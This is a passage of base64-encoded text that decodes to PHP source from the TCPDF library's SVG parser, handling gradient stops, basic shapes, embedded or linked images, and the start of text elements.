QgPiAxKSB7CgkJCQkJCSRvZmZzZXQgLz0gMTAwOwoJCQkJCX0KCQkJCX0KCQkJCSRzdG9wX2NvbG9yID0gaXNzZXQoJHN2Z3N0eWxlWydzdG9wLWNvbG9yJ10pP1RDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRzdmdzdHlsZVsnc3RvcC1jb2xvciddLCAkdGhpcy0+c3BvdF9jb2xvcnMpOidibGFjayc7CgkJCQkkb3BhY2l0eSA9IGlzc2V0KCRzdmdzdHlsZVsnc3RvcC1vcGFjaXR5J10pPyRzdmdzdHlsZVsnc3RvcC1vcGFjaXR5J106MTsKCQkJCSR0aGlzLT5zdmdncmFkaWVudHNbJHRoaXMtPnN2Z2dyYWRpZW50aWRdWydzdG9wcyddW10gPSBhcnJheSgnb2Zmc2V0JyA9PiAkb2Zmc2V0LCAnY29sb3InID0+ICRzdG9wX2NvbG9yLCAnb3BhY2l0eScgPT4gJG9wYWNpdHkpOwoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gcGF0aHMKCQkJY2FzZSAncGF0aCc6IHsKCQkJCWlmICgkaW52aXNpYmxlKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2QnXSkpIHsKCQkJCQkkZCA9IHRyaW0oJGF0dHJpYnNbJ2QnXSk7CgkJCQkJaWYgKCFlbXB0eSgkZCkpIHsKCQkJCQkJJHggPSAoaXNzZXQoJGF0dHJpYnNbJ3gnXSk/JGF0dHJpYnNbJ3gnXTowKTsKCQkJCQkJJHkgPSAoaXNzZXQoJGF0dHJpYnNbJ3knXSk/JGF0dHJpYnNbJ3knXTowKTsKCQkJCQkJJHcgPSAoaXNzZXQoJGF0dHJpYnNbJ3dpZHRoJ10pPyRhdHRyaWJzWyd3aWR0aCddOjEpOwoJCQkJCQkkaCA9IChpc3NldCgkYXR0cmlic1snaGVpZ2h0J10pPyRhdHRyaWJzWydoZWlnaHQnXToxKTsKCQkJCQkJJHRtID0gVENQREZfU1RBVElDOjpnZXRUcmFuc2Zvcm1hdGlvbk1hdHJpeFByb2R1Y3QoJHRtLCBhcnJheSgkdywgMCwgMCwgJGgsICR4LCAkeSkpOwoJCQkJCQlpZiAoJGNsaXBwaW5nKSB7CgkJCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJCQkkdGhpcy0+U1ZHUGF0aCgkZCwgJ0NOWicpOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJHRoaXMtPlN0YXJ0VHJhbnNmb3JtKCk7CgkJCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJCQkkb2JzdHlsZSA9ICR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSwgJHgsICR5LCAkdywgJGgsICdTVkdQYXRoJywgYXJyYXkoJGQsICdDTlonKSk7CgkJCQkJCQlpZiAoIWVtcHR5KCRvYnN0eWxlKSkgewoJCQkJCQkJCSR0aGlzLT5TVkdQYXRoKCRkLCAkb2JzdHlsZSk7CgkJCQkJCQl9CgkJCQkJCQkkdGhpcy0+U3RvcFRyYW5zZm9ybSgpOwoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJLy8gc2hhcGVzCgkJCWNhc2UgJ3JlY3QnOiB7CgkJCQlpZiAoJGludmlzaWJsZSkgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJJHggPSAoaXNzZXQoJGF0dHJpYnNbJ3gnXSk/JHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1sneCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkJJHkgPSAoaXNzZXQoJGF0dHJpYnNbJ3knXSk/JHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1sneSddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkJJHcgPSAoaXNzZXQoJGF0dHJpYnNbJ3dpZHRoJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3dpZHRoJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCQkkaCA9IChpc3NldCgkYXR0cmlic1snaGVpZ2h0J10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ2hlaWdodCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkJJHJ4ID0gKGlzc2V0KCRhdHRyaWJzWydyeCddKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWydyeCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkJJHJ5ID0gKGlzc2V0KCRhdHRyaWJzWydyeSddKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWydyeSddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOiRyeCk7CgkJCQlpZiAoJGNsaXBwaW5nKSB7CgkJCQkJJHRoaXMtPlNWR1RyYW5zZm9ybSgkdG0pOwoJCQkJCSR0aGlzLT5Sb3VuZGVkUmVjdFhZKCR4LCAkeSwgJHcsICRoLCAkcngsICRyeSwgJzExMTEnLCAnQ05aJywgYXJyYXkoKSwgYXJyYXkoKSk7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5TdGFydFRyYW5zZm9ybSgpOwoJCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCQkkb2JzdHlsZSA9ICR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSwgJHgsICR5LCAkdywgJGgsICdSb3VuZGVkUmVjdFhZJywgYXJyYXkoJHgsICR5LCAkdywgJGgsICRyeCwgJHJ5LCAnMTExMScsICdDTlonKSk7CgkJCQkJaWYgKCFlbXB0eSgkb2JzdHlsZSkpIHsKCQkJCQkJJHRoaXMtPlJvdW5kZWRSZWN0WFkoJHgsICR5LCAkdywgJGgsICRyeCwgJHJ5LCAnMTExMScsICRvYnN0eWxlLCBhcnJheSgpLCBhcnJheSgpKTsKCQkJCQl9CgkJCQkJJHRoaXMtPlN0b3BUcmFuc2Zvcm0oKTsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ2NpcmNsZSc6IHsKCQkJCWlmICgkaW52aXNpYmxlKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQkkciA9IChpc3NldCgkYXR0cmlic1snciddKSA/ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3InXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IDApOwoJCQkJJGN4ID0gKGlzc2V0KCRhdHRyaWJzWydjeCddKSA/ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ2N4J10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSkgOiAoaXNzZXQoJGF0dHJpYnNbJ3gnXSkgPyAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWyd4J10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSkgOiAwKSk7CgkJCQkkY3kgPSAoaXNzZXQoJGF0dHJpYnNbJ2N5J10pID8gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1snY3knXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IChpc3NldCgkYXR0cmlic1sneSddKSA/ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3knXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IDApKTsKCQkJCSR4ID0gKCRjeCAtICRyKTsKCQkJCSR5ID0gKCRjeSAtICRyKTsKCQkJCSR3ID0gKDIgKiAkcik7CgkJCQkkaCA9ICR3OwoJCQkJaWYgKCRjbGlwcGluZykgewoJCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCQkkdGhpcy0+Q2lyY2xlKCRjeCwgJGN5LCAkciwgMCwgMzYwLCAnQ05aJywgYXJyYXkoKSwgYXJyYXkoKSwgOCk7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5TdGFydFRyYW5zZm9ybSgpOwoJCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCQkkb2JzdHlsZSA9ICR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSwgJHgsICR5LCAkdywgJGgsICdDaXJjbGUnLCBhcnJheSgkY3gsICRjeSwgJHIsIDAsIDM2MCwgJ0NOWicpKTsKCQkJCQlpZiAoIWVtcHR5KCRvYnN0eWxlKSkgewoJCQkJCQkkdGhpcy0+Q2lyY2xlKCRjeCwgJGN5LCAkciwgMCwgMzYwLCAkb2JzdHlsZSwgYXJyYXkoKSwgYXJyYXkoKSwgOCk7CgkJCQkJfQoJCQkJCSR0aGlzLT5TdG9wVHJhbnNmb3JtKCk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdlbGxpcHNlJzogewoJCQkJaWYgKCRpbnZpc2libGUpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCSRyeCA9IChpc3NldCgkYXR0cmlic1sncngnXSkgPyAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWydyeCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpIDogMCk7CgkJCQkkcnkgPSAoaXNzZXQoJGF0dHJpYnNbJ3J5J10pID8gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1sncnknXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IDApOwoJCQkJJGN4ID0gKGlzc2V0KCRhdHRyaWJzWydjeCddKSA/ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ2N4J10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSkgOiAoaXNzZXQoJGF0dHJpYnNbJ3gnXSkgPyAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWyd4J10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSkgOiAwKSk7CgkJCQkkY3kgPSAoaXNzZXQoJGF0dHJpYnNbJ2N5J10pID8gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1snY3knXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IChpc3NldCgkYXR0cmlic1sneSddKSA/ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3knXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKSA6IDApKTsKCQkJCSR4ID0gKCRjeCAtICRyeCk7CgkJCQkkeSA9ICgkY3kgLSAkcnkpOwoJCQkJJHcgPSAoMiAqICRyeCk7CgkJCQkkaCA9ICgyICogJHJ5KTsKCQkJCWlmICgkY2xpcHBpbmcpIHsKCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJJHRoaXMtPkVsbGlwc2UoJGN4LCAkY3ksICRyeCwgJHJ5LCAwLCAwLCAzNjAsICdDTlonLCBhcnJheSgpLCBhcnJheSgpLCA4KTsKCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPlN0YXJ0VHJhbnNmb3JtKCk7CgkJCQkJJHRoaXMtPlNWR1RyYW5zZm9ybSgkdG0pOwoJCQkJCSRvYnN0eWxlID0gJHRoaXMtPnNldFNWR1N0eWxlcygkc3Znc3R5bGUsICRwcmV2X3N2Z3N0eWxlLCAkeCwgJHksICR3LCAkaCwgJ0VsbGlwc2UnLCBhcnJheSgkY3gsICRjeSwgJHJ4LCAkcnksIDAsIDAsIDM2MCwgJ0NOWicpKTsKCQkJCQlpZiAoIWVtcHR5KCRvYnN0eWxlKSkgewoJCQkJCQkkdGhpcy0+RWxsaXBzZSgkY3gsICRjeSwgJHJ4LCAkcnksIDAsIDAsIDM2MCwgJG9ic3R5bGUsIGFycmF5KCksIGFycmF5KCksIDgpOwoJCQkJCX0KCQkJCQkkdGhpcy0+U3RvcFRyYW5zZm9ybSgpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnbGluZSc6IHsKCQkJCWlmICgkaW52aXNpYmxlKSB7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCQkkeDEgPSAoaXNzZXQoJGF0dHJpYnNbJ3gxJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3gxJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCQkkeTEgPSAoaXNzZXQoJGF0dHJpYnNbJ3kxJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3kxJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCQkkeDIgPSAoaXNzZXQoJGF0dHJpYnNbJ3gyJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3gyJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCQkkeTIgPSAoaXNzZXQoJGF0dHJpYnNbJ3kyJ10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3kyJ10sIDAsICR0aGlzLT5zdmd1bml0LCBmYWxzZSk6MCk7CgkJCQkkeCA9ICR4MTsKCQkJCSR5ID0gJHkxOwoJCQkJJHcgPSBhYnMoJHgyIC0gJHgxKTsKCQkJCSRoID0gYWJzKCR5MiAtICR5MSk7CgkJCQlpZiAoISRjbGlwcGluZykgewoJCQkJCSR0aGlzLT5TdGFydFRyYW5zZm9ybSgpOwoJCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCQkkb2JzdHlsZSA9ICR0aGlzLT5zZXRTVkdTdHlsZXMoJHN2Z3N0eWxlLCAkcHJldl9zdmdzdHlsZSwgJHgsICR5LCAkdywgJGgsICdMaW5lJywgYXJyYXkoJHgxLCAkeTEsICR4MiwgJHkyKSk7CgkJCQkJJHRoaXMtPkxpbmUoJHgxLCAkeTEsICR4MiwgJHkyKTsKCQkJCQkkdGhpcy0+U3RvcFRyYW5zZm9ybSgpOwoJCQkJfQoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAncG9seWxpbmUnOgoJCQljYXNlICdwb2x5Z29uJzogewoJCQkJaWYgKCRpbnZpc2libGUpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCSRwb2ludHMgPSAoaXNzZXQoJGF0dHJpYnNbJ3BvaW50cyddKT8kYXR0cmlic1sncG9pbnRzJ106JzAgMCcpOwoJCQkJJHBvaW50cyA9IHRyaW0oJHBvaW50cyk7CgkJCQkvLyBub3RlIHRoYXQgcG9pbnQgbWF5IHVzZSBhIGNvbXBsZXggc3ludGF4IG5vdCBjb3ZlcmVkIGhlcmUKCQkJCSRwb2ludHMgPSBwcmVnX3NwbGl0KCcvW1wsXHNdKy9zaScsICRwb2ludHMpOwoJCQkJaWYgKGNvdW50KCRwb2ludHMpIDwgNCkgewoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJJHAgPSBhcnJheSgpOwoJCQkJJHhtaW4gPSAyMTQ3NDgzNjQ3OwoJCQkJJHhtYXggPSAwOwoJCQkJJHltaW4gPSAyMTQ3NDgzNjQ3OwoJCQkJJHltYXggPSAwOwoJCQkJZm9yZWFjaCAoJHBvaW50cyBhcyAka2V5ID0+ICR2YWwpIHsKCQkJCQkkcFska2V5XSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJHZhbCwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCQlpZiAoKCRrZXkgJSAyKSA9PSAwKSB7CgkJCQkJCS8vIFggY29vcmRpbmF0ZQoJCQkJCQkkeG1pbiA9IG1pbigkeG1pbiwgJHBbJGtleV0pOwoJCQkJCQkkeG1heCA9IG1heCgkeG1heCwgJHBbJGtleV0pOwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIFkgY29vcmRpbmF0ZQoJCQkJCQkkeW1pbiA9IG1pbigkeW1pbiwgJHBbJGtleV0pOwoJCQkJCQkkeW1heCA9IG1heCgkeW1heCwgJHBbJGtleV0pOwoJCQkJCX0KCQkJCX0KCQkJCSR4ID0gJHhtaW47CgkJCQkkeSA9ICR5bWluOwoJCQkJJHcgPSAoJHhtYXggLSAkeG1pbik7CgkJCQkkaCA9ICgkeW1heCAtICR5bWluKTsKCQkJCWlmICgkbmFtZSA9PSAncG9seWxpbmUnKSB7CgkJCQkJJHRoaXMtPlN0YXJ0VHJhbnNmb3JtKCk7CgkJCQkJJHRoaXMtPlNWR1RyYW5zZm9ybSgkdG0pOwoJCQkJCSRvYnN0eWxlID0gJHRoaXMtPnNldFNWR1N0eWxlcygkc3Znc3R5bGUsICRwcmV2X3N2Z3N0eWxlLCAkeCwgJHksICR3LCAkaCwgJ1BvbHlMaW5lJywgYXJyYXkoJHAsICdDTlonKSk7CgkJCQkJaWYgKCFlbXB0eSgkb2JzdHlsZSkpIHsKCQkJCQkJJHRoaXMtPlBvbHlMaW5lKCRwLCAkb2JzdHlsZSwgYXJyYXkoKSwgYXJyYXkoKSk7CgkJCQkJfQoJCQkJCSR0aGlzLT5TdG9wVHJhbnNmb3JtKCk7CgkJCQl9IGVsc2UgeyAvLyBwb2x5Z29uCgkJCQkJaWYgKCRjbGlwcGluZykgewoJCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJCSR0aGlzLT5Qb2x5Z29uKCRwLCAnQ05aJywgYXJyYXkoKSwgYXJyYXkoKSwgdHJ1ZSk7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRoaXMtPlN0YXJ0VHJhbnNmb3JtKCk7CgkJCQkJCSR0aGlzLT5TVkdUcmFuc2Zvcm0oJHRtKTsKCQkJCQkJJG9ic3R5bGUgPSAkdGhpcy0+c2V0U1ZHU3R5bGVzKCRzdmdzdHlsZSwgJHByZXZfc3Znc3R5bGUsICR4LCAkeSwgJHcsICRoLCAnUG9seWdvbicsIGFycmF5KCRwLCAnQ05aJykpOwoJCQkJCQlpZiAoIWVtcHR5KCRvYnN0eWxlKSkgewoJCQkJCQkJJHRoaXMtPlBvbHlnb24oJHAsICRvYnN0eWxlLCBhcnJheSgpLCBhcnJheSgpLCB0cnVlKTsKCQkJCQkJfQoJCQkJCQkkdGhpcy0+U3RvcFRyYW5zZm9ybSgpOwoJCQkJCX0KCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCS8vIGltYWdlCgkJCWNhc2UgJ2ltYWdlJzogewoJCQkJaWYgKCRpbnZpc2libGUpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWlmICghaXNzZXQoJGF0dHJpYnNbJ3hsaW5rOmhyZWYnXSkgT1IgZW1wdHkoJGF0dHJpYnNbJ3hsaW5rOmhyZWYnXSkpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCSR4ID0gKGlzc2V0KCRhdHRyaWJzWyd4J10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3gnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTowKTsKCQkJCSR5ID0gKGlzc2V0KCRhdHRyaWJzWyd5J10pPyR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGF0dHJpYnNbJ3knXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTowKTsKCQkJCSR3ID0gKGlzc2V0KCRhdHRyaWJzWyd3aWR0aCddKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWyd3aWR0aCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOjApOwoJCQkJJGggPSAoaXNzZXQoJGF0dHJpYnNbJ2hlaWdodCddKT8kdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRhdHRyaWJzWydoZWlnaHQnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTowKTsKCQkJCSRpbWcgPSAkYXR0cmlic1sneGxpbms6aHJlZiddOwoJCQkJaWYgKCEkY2xpcHBpbmcpIHsKCQkJCQkkdGhpcy0+U3RhcnRUcmFuc2Zvcm0oKTsKCQkJCQkkdGhpcy0+U1ZHVHJhbnNmb3JtKCR0bSk7CgkJCQkJJG9ic3R5bGUgPSAkdGhpcy0+c2V0U1ZHU3R5bGVzKCRzdmdzdHlsZSwgJHByZXZfc3Znc3R5bGUsICR4LCAkeSwgJHcsICRoKTsKCQkJCQlpZiAocHJlZ19tYXRjaCgnL15kYXRhOmltYWdlXC9bXjtdKztiYXNlNjQsLycsICRpbWcsICRtKSA+IDApIHsKCQkJCQkJLy8gZW1iZWRkZWQgaW1hZ2UgZW5jb2RlZCBhcyBiYXNlNjQKCQkJCQkJJGltZyA9ICdAJy5iYXNlNjRfZGVjb2RlKHN1YnN0cigkaW1nLCBzdHJsZW4oJG1bMF0pKSk7CgkJCQkJfSBlbHNlIHsKCQkJCQkJLy8gZml4IGltYWdlIHBhdGgKCQkJCQkJaWYgKCR0aGlzLT5pc1JlbGF0aXZlUGF0aCgkaW1nKSB8fCAkdGhpcy0+aGFzRXh0Rm9yYmlkZGVuUHJvdG9jb2woJGltZykpIHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWlmICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHRoaXMtPnN2Z2RpcikgQU5EICgoJGltZ1swXSA9PSAnLicpIE9SIChiYXNlbmFtZSgkaW1nKSA9PSAkaW1nKSkpIHsKCQkJCQkJCS8vIHJlcGxhY2UgcmVsYXRpdmUgcGF0aCB3aXRoIGZ1bGwgc2VydmVyIHBhdGgKCQkJCQkJCSRpbWcgPSAkdGhpcy0+c3ZnZGlyLicvJy4kaW1nOwoJCQkJCQl9CgkJCQkJCWlmICgoJGltZ1swXSA9PSAnLycpIEFORCAhZW1wdHkoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSkgQU5EICgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddICE9ICcvJykpIHsKCQkJCQkJCSRmaW5kcm9vdCA9IHN0cnBvcygkaW1nLCAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKTsKCQkJCQkJCWlmICgoJGZpbmRyb290ID09PSBmYWxzZSkgT1IgKCRmaW5kcm9vdCA+IDEpKSB7CgkJCQkJCQkJaWYgKHN1YnN0cigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCAtMSkgPT0gJy8nKSB7CgkJCQkJCQkJCSRpbWcgPSBzdWJzdHIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSwgMCwgLTEpLiRpbWc7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJGltZyA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJGltZzsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQkJJGltZyA9IHVybGRlY29kZSgkaW1nKTsKCQkJCQkJJHRlc3RzY3J0eXBlID0gQHBhcnNlX3VybCgkaW1nKTsKCQkJCQkJaWYgKGVtcHR5KCR0ZXN0c2NydHlwZVsncXVlcnknXSkpIHsKCQkJCQkJCS8vIGNvbnZlcnQgVVJMIHRvIHNlcnZlciBwYXRoCgkJCQkJCQkkaW1nID0gc3RyX3JlcGxhY2UoS19QQVRIX1VSTCwgS19QQVRIX01BSU4sICRpbWcpOwoJCQkJCQl9IGVsc2VpZiAocHJlZ19tYXRjaCgnfF5odHRwcz86Ly98JywgJGltZykgIT09IDEpIHsKCQkJCQkJCS8vIGNvbnZlcnQgc2VydmVyIHBhdGggdG8gVVJMCgkJCQkJCQkkaW1nID0gc3RyX3JlcGxhY2UoS19QQVRIX01BSU4sIEtfUEFUSF9VUkwsICRpbWcpOwoJCQkJCQl9CgkJCQkJfQoJCQkJCS8vIGdldCBpbWFnZSB0eXBlCgkJCQkJJGltZ3R5cGUgPSBUQ1BERl9JTUFHRVM6OmdldEltYWdlRmlsZVR5cGUoJGltZyk7CgkJCQkJaWYgKCgkaW1ndHlwZSA9PSAnZXBzJykgT1IgKCRpbWd0eXBlID09ICdhaScpKSB7CgkJCQkJCSR0aGlzLT5JbWFnZUVwcygkaW1nLCAkeCwgJHksICR3LCAkaCk7CgkJCQkJfSBlbHNlaWYgKCRpbWd0eXBlID09ICdzdmcnKSB7CgkJCQkJCS8vIHN0b3JlIFNWRyB2YXJzCgkJCQkJCSRzdmdncmFkaWVudHMgPSAkdGhpcy0+c3ZnZ3JhZGllbnRzOwoJCQkJCQkkc3ZnZ3JhZGllbnRpZCA9ICR0aGlzLT5zdmdncmFkaWVudGlkOwoJCQkJCQkkc3ZnZGVmc21vZGUgPSAkdGhpcy0+c3ZnZGVmc21vZGU7CgkJCQkJCSRzdmdkZWZzID0gJHRoaXMtPnN2Z2RlZnM7CgkJCQkJCSRzdmdjbGlwbW9kZSA9ICR0aGlzLT5zdmdjbGlwbW9kZTsKCQkJCQkJJHN2Z2NsaXBwYXRocyA9ICR0aGlzLT5zdmdjbGlwcGF0aHM7CgkJCQkJCSRzdmdjbGlwdG0gPSAkdGhpcy0+c3ZnY2xpcHRtOwoJCQkJCQkkc3ZnY2xpcGlkID0gJHRoaXMtPnN2Z2NsaXBpZDsKCQkJCQkJJHN2Z3RleHQgPSAkdGhpcy0+c3ZndGV4dDsKCQkJCQkJJHN2Z3RleHRtb2RlID0gJHRoaXMtPnN2Z3RleHRtb2RlOwoJCQkJCQkkdGhpcy0+SW1hZ2VTVkcoJGltZywgJHgsICR5LCAkdywgJGgpOwoJCQkJCQkvLyByZXN0b3JlIFNWRyB2YXJzCgkJCQkJCSR0aGlzLT5zdmdncmFkaWVudHMgPSAkc3ZnZ3JhZGllbnRzOwoJCQkJCQkkdGhpcy0+c3ZnZ3JhZGllbnRpZCA9ICRzdmdncmFkaWVudGlkOwoJCQkJCQkkdGhpcy0+c3ZnZGVmc21vZGUgPSAkc3ZnZGVmc21vZGU7CgkJCQkJCSR0aGlzLT5zdmdkZWZzID0gJHN2Z2RlZnM7CgkJCQkJCSR0aGlzLT5zdmdjbGlwbW9kZSA9ICRzdmdjbGlwbW9kZTsKCQkJCQkJJHRoaXMtPnN2Z2NsaXBwYXRocyA9ICRzdmdjbGlwcGF0aHM7CgkJCQkJCSR0aGlzLT5zdmdjbGlwdG0gPSAkc3ZnY2xpcHRtOwoJCQkJCQkkdGhpcy0+c3ZnY2xpcGlkID0gJHN2Z2NsaXBpZDsKCQkJCQkJJHRoaXMtPnN2Z3RleHQgPSAkc3ZndGV4dDsKCQkJCQkJJHRoaXMtPnN2Z3RleHRtb2RlID0gJHN2Z3RleHRtb2RlOwoJCQkJCX0gZWxzZSB7CgkJCQkJCSR0aGlzLT5JbWFnZSgkaW1nLCAkeCwgJHksICR3LCAkaCk7CgkJCQkJfQoJCQkJCSR0aGlzLT5TdG9wVHJhbnNmb3JtKCk7CgkJCQl9CgkJCQlicmVhazsKCQkJfQoJCQkvLyB0ZXh0CgkJCWNhc2UgJ3RleHQnOgoJCQljYXNlICd0c3Bhbic6IHsKCQkJCWlmIChpc3NldCgkdGhpcy0+c3ZndGV4dG1vZGVbJ3RleHQtYW5jaG9yJ10pIEFORCAhZW1wdHkoJHRoaXMtPnN2Z3RleHQpKSB7CgkJCQkJLy8gQFRPRE86IHVuc3VwcG9ydGVkIGZlYXR1cmUKCQkJCX0KCQkJCS8vIG9ubHkgYmFzaWMgc3VwcG9ydCAtIGFkdmFuY2VkIGZlYXR1cmVzIG11c3QgYmUgaW1wbGVtZW50ZWQKCQkJCSR0aGlzLT5zdmd0ZXh0bW9kZVsnaW52aXNpYmxlJ10gPSAkaW52aXNpYmxlOwoJCQkJaWYgKCRpbnZpc2libGUpIHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWFycmF5X3B1c2goJHRoaXMtPnN2Z3N0eWxlcywgJHN2Z3N0eWxlKTsKCQkJCWlmIChpc3NldCgkYXR0cmlic1sneCddKSkgewoJCQkJCSR4ID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1sneCddLCAwLCAkdGhpcy0+c3ZndW5pdCwgZmFsc2UpOwoJCQkJfSBlbHNlaWYgKCRuYW1lID09ICd0c3BhbicpIHsKCQkJCQkkeCA9ICR0aGlzLT54OwoJCQkJfSBlbHNlIHsKCQkJCQkkeCA9IDA7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJGF0dHJpYnNbJ2R4J10pKSB7CgkJCQkJJHggKz0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkYXR0cmlic1snZHgnXSwgMCwgJHRoaXMtPnN2Z3VuaXQsIGZhbHNlKTsKCQkJCX0KCQkJCWlmIChpc3NldCgkYXR0cmlic1sneSddKSkgewoJCQkJCSR5ID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vb